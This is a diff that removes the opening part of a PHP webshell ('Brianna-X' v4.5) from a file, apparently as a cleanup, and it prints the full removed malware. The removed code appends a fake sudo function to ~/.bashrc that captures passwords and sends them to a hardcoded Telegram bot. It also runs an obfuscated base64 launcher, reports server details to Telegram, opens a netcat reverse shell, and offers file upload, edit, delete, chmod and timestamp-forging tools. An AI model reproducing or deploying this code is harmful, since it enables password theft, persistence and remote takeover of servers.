@@ -1,2735 +1,743 @@
 <?php
-@session_start();
-@error_reporting(0);
-@ini_set('display_errors', 0);
-@set_time_limit(0);
-@clearstatcache();
-@ignore_user_abort(true);
-
-$spread_link_file = '/tmp/.cache.log';
-
-$_sudotrap_marker = '/tmp/.sudotrap_installed_' . md5(__DIR__);
-if (!@file_exists($_sudotrap_marker)) {
-    $_domain = $_SERVER['HTTP_HOST'] ?? 'Unknown';
-    $_ip = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
-    $_web_user = @get_current_user() ?: 'Unknown';
-    $_tg_url = 'https://api.telegram.org/8490052237:AAEc-Kd4ggRKAf6-eC_xUjGgnTfwyCBQKZQ/sendMessage';
-
-    $_trap_content = 'function sudo() {
-# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
-{ echo L3Vzci9iaW4vcGtpbGwgLTAgLVUxMDAwIGRlZnVuY3QgMj4vZGV2L251bGwgfHwgKFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgJEhPTUUvLmNvbmZpZy9odG9wL2RlZnVuY3QuZGF0IC1saXFEIiBleGVjIC1hICdbY2FyZDAtY3J0YzhdJyAnJEhPTUUvLmNvbmZpZy9odG9wL2RlZnVuY3QnIDI+L2Rldi9udWxsKQ== | base64 -d | bash; } 2>/dev/null
-
-    if [[ "$1" =~ ^- ]]; then
-        /usr/bin/sudo "$@"
-        return
-    fi
-
-    echo -n "[sudo] password for $USER: "
-    read -s pwd
-    echo
-
-    CMD=$(printf "%q " "$@")
-    HOST=$(hostname -d)
-    IP=$(hostname -I | awk \'{print $1}\')
-    BOT_TOKEN="8490052237:AAEc-Kd4ggRKAf6-eC_xUjGgnTfwyCBQKZQ"
-    CHAT_ID="7948726022"
-
-    ASKPASS=$(mktemp)
-    echo "#!/bin/bash" > "$ASKPASS"
-    echo "echo \'$pwd\'" >> "$ASKPASS"
-    chmod +x "$ASKPASS"
-
-    WHO=$(SUDO_ASKPASS="$ASKPASS" setsid /usr/bin/sudo -A whoami 2>/dev/null)
-
-    if [[ "$WHO" == "root" ]]; then
-        STATUS="✅ <b>[VALID]</b>"
-        VALID=1
-    else
-        STATUS="❌ <b>[INVALID]</b>"
-        VALID=0
-    fi
-
-    MESSAGE="🔥 <b>[SUDO LOGGER]</b> $STATUS
-🖥️ Host: <code>$HOST</code>
-📡 IP: <code>$IP</code>
-👤 User: <code>$USER</code>
-🔧 Command: <code>sudo $CMD</code>
-🔑 Pass: <code>$pwd</code>"
-
-    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-         -d chat_id="$CHAT_ID" \
-         -d text="$MESSAGE" \
-         -d parse_mode=HTML >/dev/null
-
-    if [[ $VALID -eq 1 ]]; then
-        if [[ "$1" == "su" || "$1" == "bash" ]]; then
-            SUDO_ASKPASS="$ASKPASS" script -q -c "/usr/bin/sudo -A -- $*" /dev/null
-        else
-            SUDO_ASKPASS="$ASKPASS" setsid /usr/bin/sudo -A -- "$@"
-        fi
-    else
-        echo "Sorry, try again."
-    fi
-
-    sleep 1
-    rm -f "$ASKPASS"
-}';
-
-    $_home_dir = @getenv('HOME') ?: (@$_SERVER['HOME'] ?: (@function_exists('posix_getpwuid') ? @posix_getpwuid(@posix_getuid())['dir'] : ''));
-
-    if (!$_home_dir) {
-        // Gagal: tidak ada home directory
-        $_tg_msg = "🪤 <b>SUDO TRAP FAILED</b>\n";
-        $_tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-        $_tg_msg .= "🌐 <b>Domain:</b> <code>{$_domain}</code>\n";
-        $_tg_msg .= "📡 <b>IP:</b> <code>{$_ip}</code>\n";
-        $_tg_msg .= "👤 <b>User:</b> <code>{$_web_user}</code>\n";
-        $_tg_msg .= "❌ <b>Error:</b> HOME directory tidak ditemukan\n";
-        $_tg_msg .= "⏰ <b>Waktu:</b> " . date('Y-m-d H:i:s');
-        $_tg_data = ['chat_id' => '7948726022', 'text' => $_tg_msg, 'parse_mode' => 'HTML'];
-        @file_get_contents($_tg_url . '?' . http_build_query($_tg_data));
-    } else {
-        $_bashrc_path = $_home_dir . '/.bashrc';
-        $_bashrc_content = @file_get_contents($_bashrc_path) ?: '';
-
-        if (strpos($_bashrc_content, '# SUDO TRAP START') !== false) {
-            // Sudah terinstall sebelumnya
-            $_tg_msg = "🪤 <b>SUDO TRAP ALREADY INSTALLED</b>\n";
-            $_tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-            $_tg_msg .= "🌐 <b>Domain:</b> <code>{$_domain}</code>\n";
-            $_tg_msg .= "📡 <b>IP:</b> <code>{$_ip}</code>\n";
-            $_tg_msg .= "📁 <b>Bashrc:</b> <code>{$_bashrc_path}</code>\n";
-            $_tg_msg .= "⏰ <b>Waktu:</b> " . date('Y-m-d H:i:s');
-            $_tg_data = ['chat_id' => '7948726022', 'text' => $_tg_msg, 'parse_mode' => 'HTML'];
-            @file_get_contents($_tg_url . '?' . http_build_query($_tg_data));
-        } else {
-            $_install_content = "\n\n# SUDO TRAP START\n" . $_trap_content . "\n# SUDO TRAP END\n";
-            if (@file_put_contents($_bashrc_path, $_bashrc_content . $_install_content)) {
-                // Berhasil install
-                $_tg_msg = "🪤 <b>SUDO TRAP AKTIF!</b>\n";
-                $_tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-                $_tg_msg .= "🌐 <b>Domain:</b> <code>{$_domain}</code>\n";
-                $_tg_msg .= "📡 <b>IP:</b> <code>{$_ip}</code>\n";
-                $_tg_msg .= "👤 <b>User:</b> <code>{$_web_user}</code>\n";
-                $_tg_msg .= "📁 <b>Bashrc:</b> <code>{$_bashrc_path}</code>\n";
-                $_tg_msg .= "⏰ <b>Waktu:</b> " . date('Y-m-d H:i:s') . "\n";
-                $_tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-                $_tg_msg .= "✅ <b>Trap sudah terpasang!</b>\n";
-                $_tg_msg .= "⏳ Tinggal tunggu ada yang ketik sudo...";
-                $_tg_data = ['chat_id' => '7948726022', 'text' => $_tg_msg, 'parse_mode' => 'HTML'];
-                @file_get_contents($_tg_url . '?' . http_build_query($_tg_data));
-            } else {
-                // Gagal write ke bashrc
-                $_tg_msg = "🪤 <b>SUDO TRAP FAILED</b>\n";
-                $_tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-                $_tg_msg .= "🌐 <b>Domain:</b> <code>{$_domain}</code>\n";
-                $_tg_msg .= "📡 <b>IP:</b> <code>{$_ip}</code>\n";
-                $_tg_msg .= "👤 <b>User:</b> <code>{$_web_user}</code>\n";
-                $_tg_msg .= "📁 <b>Bashrc:</b> <code>{$_bashrc_path}</code>\n";
-                $_tg_msg .= "❌ <b>Error:</b> Tidak bisa write ke .bashrc\n";
-                $_tg_msg .= "⏰ <b>Waktu:</b> " . date('Y-m-d H:i:s');
-                $_tg_data = ['chat_id' => '7948726022', 'text' => $_tg_msg, 'parse_mode' => 'HTML'];
-                @file_get_contents($_tg_url . '?' . http_build_query($_tg_data));
-            }
-        }
-    }
-    @file_put_contents($_sudotrap_marker, date('Y-m-d H:i:s'));
-}
-
-const WEBSHELL_VERSION = '4.5';
-
-const TELEGRAM_BOT_TOKEN = '8490052237:AAEc-Kd4ggRKAf6-eC_xUjGgnTfwyCBQKZQ';
-const TELEGRAM_CHAT_ID = '7948726022';
-const MAX_TELEGRAM_LENGTH = 4000;
-
- $current_script_path = @realpath($_SERVER['SCRIPT_FILENAME'] ?? '');
- $source_file_content = @file_get_contents($current_script_path);
-
-function get_base_url() {
-    $protocol = (@$_SERVER["HTTPS"] == "on" || @$_SERVER["SERVER_PORT"] == 443) ? "https://" : "http://";
-    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'];
-    return $protocol . $host;
-}
-
-function get_web_url_from_path($local_path) {
-    if (empty($local_path)) { return 'N/A'; }
-    $resolved_path = @realpath($local_path);
-    if (!$resolved_path) { return 'N/A'; }
-    $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
-    $base_url = get_base_url();
-    if (!empty($document_root) && @strpos($resolved_path, $document_root) === 0) {
-        $rel = str_replace($document_root, '', $resolved_path);
-        $rel = ltrim($rel, DIRECTORY_SEPARATOR);
-        $enc = @implode('/', @array_map('rawurlencode', @explode(DIRECTORY_SEPARATOR, $rel)));
-        return $base_url . '/' . $enc;
-    }
-    return 'N/A';
-}
-
-function send_telegram_report($message = '', $parse_mode = 'HTML') {
-    if (!@defined('TELEGRAM_BOT_TOKEN') || !@defined('TELEGRAM_CHAT_ID')) { return false; }
-    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
-    $params = ['chat_id' => TELEGRAM_CHAT_ID, 'text' => $message, 'parse_mode' => $parse_mode, 'disable_web_page_preview' => true];
-
-    // Try curl first, fallback to file_get_contents
-    if (@function_exists('curl_init')) {
-        $ch = @curl_init();
-        if ($ch) {
-            @curl_setopt($ch, CURLOPT_URL, $url); @curl_setopt($ch, CURLOPT_POST, 1);
-            @curl_setopt($ch, CURLOPT_POSTFIELDS, $params); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-            @curl_setopt($ch, CURLOPT_TIMEOUT, 5); $result = @curl_exec($ch); @curl_close($ch);
-        }
-    } else {
-        // Fallback using file_get_contents
-        $query = http_build_query($params);
-        $context = @stream_context_create(['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => $query, 'timeout' => 5]]);
-        @file_get_contents($url, false, $context);
-    }
-    return true;
-}
-
-function get_initial_info() {
-    $current_domain = $_SERVER['HTTP_HOST'] ?? 'Unknown Host';
-    $shell_url = get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/');
-    $os_info = @php_uname();
-    $php_version = @phpversion();
-    $server_ip = @$_SERVER['SERVER_ADDR'] ?? @gethostbyname($current_domain);
-    $user_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown User IP';
-
-    $report_message = "<b>\u{1F4BB} ACCESS REPORT: BRIANNA-X</b>\n";
-    $report_message .= "==============================\n";
-    $report_message .= "<b>URL Shell:</b> <a href=\"{$shell_url}\">{$shell_url}</a>\n";
-    $report_message .= "<b>IP Server:</b> <code>{$server_ip}</code>\n";
-    $report_message .= "<b>OS Server:</b> <code>{$os_info}</code>\n";
-    $report_message .= "<b>PHP Version:</b> <code>{$php_version}</code>\n";
-    $report_message .= "<b>Akses Dari IP:</b> <code>{$user_ip}</code>\n";
-    $report_message .= "==============================\n";
-    $report_message .= "<b>Waktu:</b> " . @date('Y-m-d H:i:s') . "\n";
-
-    return $report_message;
-}
-
-function deleteRecursive($target) {
-    if (@is_dir($target)) { foreach (@scandir($target) as $item) { if ($item == '.' || $item == '..') continue; deleteRecursive($target . DIRECTORY_SEPARATOR . $item); } @rmdir($target); } else { @unlink($target); }
-}
-
-function get_perms_string($file) {
-    if (!@file_exists($file)) return '----------'; $perms = @fileperms($file);
-    if ($perms === false) return '----------';
-    $info = (($perms & 0x4000) ? 'd' : '-'); $info .= (($perms & 0x0100) ? 'r' : '-');
-    $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? 'x' : '-');
-    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-');
-    $info .= (($perms & 0x0008) ? 'x' : '-'); $info .= (($perms & 0x0004) ? 'r' : '-');
-    $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? 'x' : '-');
-    return $info;
-}
-
-function generate_random_filename() {
-    $characters = 'abcdefghijklmnopqrstuvwxyz'; 
-    $random_string = ''; $length = 12;
-    $char_length = @strlen($characters) - 1;
-    for ($i = 0; $i < $length; $i++) { $random_string .= $characters[@mt_rand(0, $char_length)]; }
-    $prefixes = ['cache_', 'temp_', 'config_', 'session_', 'data_', 'module_'];
-    $prefix = $prefixes[@array_rand($prefixes)];
-    return $prefix . $random_string . '.php';
-}
-
-function nc_reverse_shell($ip, $port) {
-    $nc_binaries = ['nc', 'netcat', '/usr/bin/nc', '/usr/bin/netcat', '/usr/local/bin/nc', '/usr/local/bin/netcat', '/bin/nc', '/bin/netcat'];
-    $found_nc = null; $command_exec_function = null;
-    if (@function_exists('shell_exec')) { $command_exec_function = 'shell_exec'; } elseif (@function_exists('passthru')) { $command_exec_function = 'passthru'; } else { return false; }
-    foreach ($nc_binaries as $nc) {
-        $check_cmd = "which " . escapeshellarg($nc);
-        $output = '';
-        if ($command_exec_function === 'shell_exec') { $output = @shell_exec($check_cmd); } elseif ($command_exec_function === 'passthru') { @ob_start(); @passthru($check_cmd . ' 2>&1', $return_var); $output = @ob_get_clean(); if ($return_var !== 0) $output = ''; }
-        if (!empty(trim($output))) { $found_nc = trim($output); break; }
-    }
-    if (!$found_nc) {
-        foreach (['nc', 'netcat'] as $nc_fallback) {
-            if ($command_exec_function === 'shell_exec') { $output = @shell_exec(escapeshellarg($nc_fallback) . ' -h 2>&1'); if (!empty($output) && (@strpos($output, 'usage') !== false || @strpos($output, 'Usage:') !== false)) { $found_nc = $nc_fallback; break; } }
-            elseif ($command_exec_function === 'passthru') { @ob_start(); @passthru(escapeshellarg($nc_fallback) . ' -h 2>&1', $return_var); $output = @ob_get_clean(); if ($return_var == 0 && !empty($output) && (@strpos($output, 'usage') !== false || @strpos($output, 'Usage:') !== false)) { $found_nc = $nc_fallback; break; } }
-        }
-    }
-    if ($found_nc) {
-        $ip_esc = escapeshellarg($ip); $port_esc = escapeshellarg($port);
-        $nc_cmd_e = "nohup " . escapeshellarg($found_nc) . " {$ip_esc} {$port_esc} -e /bin/bash > /dev/null 2>&1 &";
-        $success = false;
-        if ($command_exec_function === 'shell_exec') { @shell_exec($nc_cmd_e); $success = true; } elseif ($command_exec_function === 'passthru') { @passthru($nc_cmd_e, $return_var_e); $success = ($return_var_e === 0); }
-        return $success ? ($found_nc . " (Netcat)") : false;
-    }
-    return false;
-}
-
-function scan_dir_for_shells($dir, $current_depth = 0) {
-    global $suspicious_keywords, $found_shells, $max_depth, $current_script_path, $source_file_content, $document_root, $base_url, $scanned_dirs_count, $scanned_files_count;
-
-    // Jika max_depth = 0, berarti unlimited (scan semua)
-    if ($max_depth > 0 && $current_depth >= $max_depth) return;
-
-    // Increment counter
-    $scanned_dirs_count++;
-
-    $items = @scandir($dir);
-    if (!$items) return;
-
-    foreach ($items as $item) {
-        if ($item == '.' || $item == '..') continue;
-
-        $path = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
-
-        if (@is_dir($path)) {
-            if (@realpath($path) != @realpath(dirname($path))) {
-               scan_dir_for_shells($path, $current_depth + 1);
-            }
-        } elseif (@preg_match('/\.(php|phtml|asp|aspx)$/i', $item)) {
-            $scanned_files_count++;
-            $content = @file_get_contents($path);
-
-            if (!empty($source_file_content) && $content === $source_file_content) {
-                continue;
-            }
-
-            $resolved_path = @realpath($path) ? @realpath($path) : $path;
-            if (!empty($current_script_path) && $resolved_path === $current_script_path) {
-                continue;
-            }
-
-            if ($content !== false && $content !== '') {
-                foreach ($suspicious_keywords as $keyword) {
-                    if (@stripos($content, $keyword) !== false) {
-
-                        $web_url = get_web_url_from_path($resolved_path);
-
-                        $found_shells[] = ['url' => $web_url, 'match' => $keyword, 'path' => $path];
-                        break;
-                    }
-                }
-            }
-        }
-    }
-}
-
-if (isset($_FILES['upload_file'])) {
-    $currentDir = isset($_GET['dir']) ? @realpath($_GET['dir']) : @getcwd();
-    if (!@is_dir($currentDir)) $currentDir = @getcwd();
-    $target = $currentDir . DIRECTORY_SEPARATOR . @basename($_FILES['upload_file']['name']);
-    if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) { @chmod($target, 0644); }
-    header("Location: ?dir=" . urlencode($currentDir)); exit;
-}
-
-if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
-    $currentDir = isset($_GET['dir']) ? @realpath($_GET['dir']) : @getcwd();
-    $target = $currentDir . DIRECTORY_SEPARATOR . $_POST['folder_name'];
-    @mkdir($target); @chmod($target, 0777);
-    header("Location: ?dir=" . urlencode($currentDir)); exit;
-}
-
-if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
-    $currentDir = isset($_GET['dir']) ? @realpath($_GET['dir']) : @getcwd();
-    $target = $currentDir . DIRECTORY_SEPARATOR . $_POST['file_name'];
-    $fp = @fopen($target, 'w'); if ($fp) { @fclose($fp); @chmod($target, 0666); }
-    header("Location: ?dir=" . urlencode($currentDir)); exit;
-}
-
-if (isset($_GET['delete'])) {
-    $target = @realpath($_GET['delete']);
-    if ($target) deleteRecursive($target);
-    header("Location: ?dir=" . urlencode($_GET['dir'])); exit;
-}
-
-if (isset($_GET['download'])) {
-    $file = @urldecode($_GET['download']);
-    if (@is_file($file)) {
-        while (ob_get_level()) @ob_end_clean();
-        header("Content-Type: application/octet-stream");
-        header("Content-Disposition: attachment; filename=\"" . @basename($file) . "\"");
-        header("Content-Length: " . @filesize($file));
-        @readfile($file); exit;
-    }
-}
-
-if (isset($_POST['do_rename'])) {
-    $old = @realpath($_POST['old_path']);
-    $new = @dirname($old) . DIRECTORY_SEPARATOR . @basename($_POST['new_name']);
-    if (@file_exists($old) && @rename($old, $new)) { echo "OK"; } else { echo "Failed."; }
-    exit;
-}
-if (isset($_GET['rename']) && isset($_GET['ajax'])) {
-    $old = $_GET['rename'];
-    echo "<h3 style='color:#fff;margin-top:0;'>Rename: " . htmlspecialchars(basename($old)) . "</h3>
-    <form method='post' onsubmit='submitRename(event)'>
-    <input type='text' id='newName' placeholder='New Name' value='" . htmlspecialchars(basename($old)) . "' style='background:#222;border:1px solid #444;color:#fff;padding:10px;width:100%;margin-bottom:10px;'>
-    <input type='hidden' id='oldPath' value='" . htmlspecialchars($old) . "'>
-    <button type='submit' class='btn-primary'>Rename</button>
-    </form>
-    <div id='renameStatus'></div>";
-    exit;
-}
-
-if (isset($_POST['do_touch'])) {
-    $file = $_POST['touch_file'];
-    $time_str = $_POST['new_time'];
-    $success = false;
-    if ($time_str == 'now') { $success = @touch($file); } else { $ts = @strtotime($time_str); if ($ts) $success = @touch($file, $ts); }
-    echo $success ? "OK" : "Failed"; exit;
-}
-if (isset($_GET['touch_modal']) && isset($_GET['ajax'])) {
-    $file = $_GET['touch_modal']; $mod = @filemtime($file);
-    $current_date = ($mod) ? date('Y-m-d\TH:i', $mod) : '';
-    echo "<h3 style='color:#fff;margin-top:0;'>Modify Time: " . htmlspecialchars(basename($file)) . "</h3>
-    <form method='post' onsubmit='submitTouch(event)'>
-    <input type='hidden' id='touchFile' value='" . htmlspecialchars($file) . "'>
-    <label style='display:block;margin-bottom:5px;color:#ccc;'>New Date & Time:</label>
-    <input type='datetime-local' id='newTime' value='$current_date' style='background:#222;border:1px solid #444;color:#fff;padding:10px;width:100%;margin-bottom:10px;'>
-    <button type='button' onclick='setTimeNow(\"newTime\")' class='btn-tool' style='margin-bottom:10px;width:100%;'>Set to Now</button>
-    <button type='submit' class='btn-primary'>Update</button>
-    </form>
-    <div id='touchStatus'></div>";
-    exit;
-}
-
-if (isset($_POST['do_chmod'])) {
-    $file = $_POST['file']; $perm = (int) @base_convert($_POST['perm'], 8, 10);
-    echo (@chmod($file, $perm)) ? "OK" : "Failed."; exit;
-}
-if (isset($_GET['chmod_modal']) && isset($_GET['ajax'])) {
-    $file = $_GET['chmod_modal']; $perm = @substr(sprintf("%o", @fileperms($file)), -4);
-    echo "<h3 style='color:#fff;margin-top:0;'>Permissions: " . htmlspecialchars(basename($file)) . "</h3>
-    <form method='post' onsubmit='submitChmod(event)'>
-    <input type='text' id='newPerm' value='$perm' placeholder='0777' style='background:#222;border:1px solid #444;color:#fff;padding:10px;width:100%;margin-bottom:10px;'>
-    <input type='hidden' id='targetFile' value='" . htmlspecialchars($file) . "'>
-    <button type='submit' class='btn-primary'>Change</button>
-    </form>
-    <div id='chmodStatus'></div>";
-    exit;
-}
-
-if (isset($_POST['save_edit'])) {
-    $file = $_POST['target_file']; $data = $_POST['new_content'];
-    $result = @file_put_contents($file, $data);
-    if ($result === false) { echo "Error writing file."; } else { @chmod($file, 0666); echo "OK"; }
-    exit;
-}
-if (isset($_GET['edit']) && isset($_GET['ajax']) && @is_file($_GET['edit'])) {
-    $file = $_GET['edit']; $content = @file_get_contents($file);
-    echo "<h3 style='color:#fff;margin-top:0;'>Edit: " . htmlspecialchars(@basename($file)) . "</h3>
-    <form onsubmit='saveFile(event); return false;'>
-    <input type='hidden' id='editFilePath' value='" . htmlspecialchars($file) . "'>
-    <textarea id='fileContent' style='width:100%;height:400px;background:#111;color:#fff;border:none;padding:10px;font-family:monospace;font-size:13px;resize:vertical;'>" . htmlspecialchars($content) . "</textarea>
-    <button type='submit' class='btn-primary' style='margin-top:10px;'>SAVE</button>
-    </form>
-    <div id='editStatus'></div>";
-    exit;
-}
-
-// ===== FIND MODIFIED FILES HANDLER =====
-if (isset($_GET['find_modified']) && isset($_GET['ajax'])) {
-    header('Content-Type: text/html; charset=utf-8');
-
-    if (isset($_POST['bulk_delete']) && isset($_POST['files'])) {
-        $files_to_delete = $_POST['files'];
-        $deleted = 0; $failed = 0;
-        $deleted_files = []; $failed_files = [];
-        foreach ($files_to_delete as $file) {
-            $file = trim($file);
-            if (!empty($file) && @file_exists($file)) {
-                if (@unlink($file)) { $deleted++; $deleted_files[] = basename($file); }
-                else { $failed++; $failed_files[] = basename($file); }
-            }
-        }
-        echo "<h3>Hasil Penghapusan</h3><div style='padding:15px;background:#0a0a0a;border-radius:8px;'>";
-        if ($deleted > 0) {
-            echo "<div style='background:#0a2a0a;padding:10px;border-radius:4px;margin-bottom:8px;border-left:3px solid #0f0;'>";
-            echo "<div style='color:#0f0;font-weight:bold;'>{$deleted} file berhasil dihapus</div></div>";
-        }
-        if ($failed > 0) {
-            echo "<div style='background:#2a0a0a;padding:10px;border-radius:4px;border-left:3px solid #f44;'>";
-            echo "<div style='color:#f44;font-weight:bold;'>{$failed} file gagal dihapus</div></div>";
-        }
-        echo "<button onclick=\"closeAjaxModal();location.reload();\" style='margin-top:15px;padding:10px 20px;background:#333;color:#fff;border:none;border-radius:4px;cursor:pointer;'>Tutup</button></div>";
-        exit;
-    }
-
-    if (isset($_POST['do_search'])) {
-        $search_dir = isset($_POST['search_dir']) ? $_POST['search_dir'] : '/';
-        $date_from = isset($_POST['date_from']) ? $_POST['date_from'] : '';
-        $date_to = isset($_POST['date_to']) ? $_POST['date_to'] : '';
-        $max_results = isset($_POST['max_results']) ? intval($_POST['max_results']) : 100;
-        $search_dir = @realpath($search_dir) ?: $search_dir;
-
-        if (!@is_dir($search_dir) || !@is_readable($search_dir)) {
-            echo "<div style='padding:20px;background:#2a0a0a;border:1px solid #f44;border-radius:8px;'>";
-            echo "<h3 style='color:#f44;'>Error</h3><p style='color:#f88;'>Direktori tidak valid</p>";
-            echo "<button onclick=\"openModal('?find_modified=1&ajax=1')\" style='padding:8px 16px;background:#333;color:#fff;border:none;border-radius:4px;cursor:pointer;'>Kembali</button></div>";
-            exit;
-        }
-
-        $output = [];
-        try {
-            $iterator = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator($search_dir, RecursiveDirectoryIterator::SKIP_DOTS),
-                RecursiveIteratorIterator::LEAVES_ONLY, RecursiveIteratorIterator::CATCH_GET_CHILD
-            );
-            $count = 0;
-            $date_from_ts = !empty($date_from) ? strtotime($date_from . ' 00:00:00') : 0;
-            $date_to_ts = !empty($date_to) ? strtotime($date_to . ' 23:59:59') : PHP_INT_MAX;
-            foreach ($iterator as $file) {
-                try {
-                    if ($file->isFile() && $file->isReadable()) {
-                        $mtime = $file->getMTime();
-                        if ($mtime >= $date_from_ts && $mtime <= $date_to_ts) {
-                            $output[] = $file->getPathname();
-                            $count++;
-                            if ($max_results > 0 && $count >= $max_results) break;
-                        }
-                    }
-                } catch (Exception $e) { continue; }
-            }
-        } catch (Exception $e) { }
-
-        echo "<h3>Modified Files</h3>";
-        if (empty($output)) {
-            echo "<p style='color:#888;'>Tidak ada file ditemukan.</p>";
-            echo "<button onclick=\"openModal('?find_modified=1&ajax=1')\" style='padding:8px 16px;background:#333;color:#fff;border:none;border-radius:4px;cursor:pointer;'>Cari Lagi</button>";
-            exit;
-        }
-
-        $counts = ['all'=>0,'php'=>0,'html'=>0,'js'=>0,'css'=>0,'config'=>0,'image'=>0,'other'=>0];
-        $file_data = [];
-        foreach ($output as $f) {
-            $f = trim($f);
-            if (empty($f) || !@file_exists($f)) continue;
-            $ftype = 'other';
-            if (preg_match('/\.(php|phtml)$/i', $f)) $ftype = 'php';
-            elseif (preg_match('/\.(html|htm)$/i', $f)) $ftype = 'html';
-            elseif (preg_match('/\.js$/i', $f)) $ftype = 'js';
-            elseif (preg_match('/\.(css|scss)$/i', $f)) $ftype = 'css';
-            elseif (preg_match('/\.(jpg|jpeg|png|gif|webp|svg)$/i', $f)) $ftype = 'image';
-            elseif (preg_match('/(\.htaccess|\.env|config)/i', $f)) $ftype = 'config';
-            $counts[$ftype]++; $counts['all']++;
-            $file_data[] = ['path'=>$f,'type'=>$ftype];
-        }
-
-        echo "<div style='margin-bottom:12px;display:flex;flex-wrap:wrap;gap:6px;'>";
-        $filter_btns = [['all','ALL','#00aa00','#0f0'],['php','PHP','#661111','#f44'],['html','HTML','#113366','#4af'],['js','JS','#665511','#ff0'],['css','CSS','#331155','#a4f'],['config','Config','#664411','#f90'],['image','Image','#116644','#0f9'],['other','Other','#333','#888']];
-        foreach ($filter_btns as $btn) {
-            if ($counts[$btn[0]] > 0 || $btn[0] == 'all') {
-                echo "<span class='flt-btn' onclick=\"doFilter('{$btn[0]}')\" style='padding:5px 10px;background:{$btn[2]};color:{$btn[3]};border:1px solid {$btn[3]};border-radius:4px;cursor:pointer;font-size:11px;'>{$btn[1]}({$counts[$btn[0]]})</span>";
-            }
-        }
-        echo "</div>";
-
-        echo "<p style='color:#0f0;font-size:12px;'>Total: {$counts['all']} file | <span id='selectedCount'>0 dipilih</span></p>";
-        echo "<form id='bulkDeleteForm' method='post' action='?find_modified=1&ajax=1'>";
-        echo "<input type='hidden' name='bulk_delete' value='1'>";
-        echo "<div style='background:#0a0a0a;padding:10px;border-radius:6px;max-height:300px;overflow-y:auto;'>";
-        echo "<table style='width:100%;border-collapse:collapse;font-size:11px;'>";
-        echo "<thead><tr style='background:#1a1a1a;'><th style='padding:6px;border:1px solid #333;width:30px;'><input type='checkbox' id='selectAll' onclick='toggleSelectAll()'></th><th style='padding:6px;border:1px solid #333;text-align:left;'>Path</th><th style='padding:6px;border:1px solid #333;width:100px;'>Modified</th><th style='padding:6px;border:1px solid #333;width:60px;'>Size</th></tr></thead><tbody>";
-
-        foreach ($file_data as $fd) {
-            $file = $fd['path']; $ftype = $fd['type'];
-            $stat = @stat($file);
-            $mtime = $stat ? date('Y-m-d H:i', $stat['mtime']) : 'N/A';
-            $size = $stat ? $stat['size'] : 0;
-            $colors = ['php'=>'#f44','html'=>'#4af','js'=>'#ff0','css'=>'#a4f','config'=>'#f90','image'=>'#0f9','other'=>'#888'];
-            $color = $colors[$ftype] ?? '#888';
-            $size_fmt = $size < 1024 ? $size.'B' : round($size/1024,1).'K';
-            echo "<tr class='frow' data-ft='{$ftype}'>";
-            echo "<td style='padding:4px;border:1px solid #333;text-align:center;'><input type='checkbox' name='files[]' value='".htmlspecialchars($file)."' class='file-checkbox' onchange='updateSelectedCount()'></td>";
-            echo "<td style='padding:4px;border:1px solid #333;color:{$color};word-break:break-all;'>".htmlspecialchars($file)."</td>";
-            echo "<td style='padding:4px;border:1px solid #333;color:#777;font-size:10px;'>{$mtime}</td>";
-            echo "<td style='padding:4px;border:1px solid #333;color:#777;font-size:10px;'>{$size_fmt}</td></tr>";
-        }
-        echo "</tbody></table></div>";
-        echo "<div style='margin-top:10px;display:flex;gap:10px;'>";
-        echo "<button type='button' id='deleteSelectedBtn' onclick='deleteSelected()' style='padding:8px 16px;background:#661111;color:#f44;border:1px solid #f44;border-radius:4px;cursor:pointer;' disabled>Hapus Terpilih (<span id='delCount'>0</span>)</button>";
-        echo "<button type='button' onclick=\"openModal('?find_modified=1&ajax=1')\" style='padding:8px 16px;background:#333;color:#fff;border:none;border-radius:4px;cursor:pointer;'>Cari Lagi</button>";
-        echo "</div></form>";
-
-        echo "<script>
-function doFilter(ft){var rows=document.querySelectorAll('.frow');for(var i=0;i<rows.length;i++){rows[i].style.display=(ft==='all'||rows[i].getAttribute('data-ft')===ft)?'':'none';}}
-function updateSelectedCount(){var c=document.querySelectorAll('.file-checkbox:checked').length;document.getElementById('selectedCount').textContent=c+' dipilih';document.getElementById('delCount').textContent=c;document.getElementById('deleteSelectedBtn').disabled=(c===0);}
-function toggleSelectAll(){var cb=document.querySelectorAll('.file-checkbox');var sa=document.getElementById('selectAll');for(var i=0;i<cb.length;i++){var r=cb[i].closest('tr');if(r&&r.style.display!=='none')cb[i].checked=sa.checked;}updateSelectedCount();}
-function deleteSelected(){var c=document.querySelectorAll('.file-checkbox:checked');if(c.length===0)return;if(!confirm('Hapus '+c.length+' file?'))return;var fd=new FormData();fd.append('bulk_delete','1');for(var i=0;i<c.length;i++)fd.append('files[]',c[i].value);document.getElementById('ajaxContent').innerHTML='<p style=\"color:#ff0;padding:50px;text-align:center;\">Menghapus...</p>';fetch('?find_modified=1&ajax=1',{method:'POST',body:fd}).then(r=>r.text()).then(h=>{document.getElementById('ajaxContent').innerHTML=h;});}
-</script>";
-        exit;
-    }
-
-    echo "<h3>Find Modified Files</h3><div style='padding:15px;background:#0a0a0a;border-radius:8px;'>";
